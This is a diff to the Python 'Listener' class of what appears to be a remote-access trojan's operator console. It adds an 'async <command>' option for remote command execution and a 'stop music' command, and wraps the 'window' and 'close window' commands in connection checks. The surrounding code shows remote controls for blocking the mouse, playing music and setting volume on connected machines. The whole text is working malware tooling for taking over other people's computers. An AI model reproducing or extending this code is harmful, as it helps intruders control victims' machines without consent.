@@ -150,6 +150,7 @@ class Listener:
 				help_message += colored(" mouse true", "green") + " - unblock mouse;\n"
 				help_message += colored(" play music", "green") + " - play music;\n"
 				help_message += colored(" volume <negative number>", "green") + " - set volume;\n"
+				help_message += colored(" async <command>", "green") + " - use it for async command execution;\n"
 				help_message += colored(" exit", "red") + " - stop the program;\n"
 				print(help_message)
 
@@ -242,6 +243,15 @@ class Listener:
 						print(colored(res, "green"))
 				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
+			elif command == "stop music":
+				if self.chosen_connection:
+					res = self.execute_remotely(command)
+					if res.split()[0] == "[~]":
+						print(colored(res, "yellow"))
+					else:
+						print(colored(res, "green"))
+				else: print(colored("[-] You didn't choose any connection yet", "red"))
+
 			elif command.strip() and command.split()[0] == "volume":
 				if self.chosen_connection:
 					try:
@@ -264,12 +274,16 @@ class Listener:
 				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 			elif command == "window":
-				res = self.execute_remotely(command)
-				print(res)
+				if self.chosen_connection:
+					res = self.execute_remotely(command)
+					print(res)
+				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 			elif command == "close window":
-				res = self.execute_remotely(command)
-				print(res)
+				if self.chosen_connection:
+					res = self.execute_remotely(command)
+					print(res)
+				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 			elif len(command.split()):
 				if self.chosen_connection:
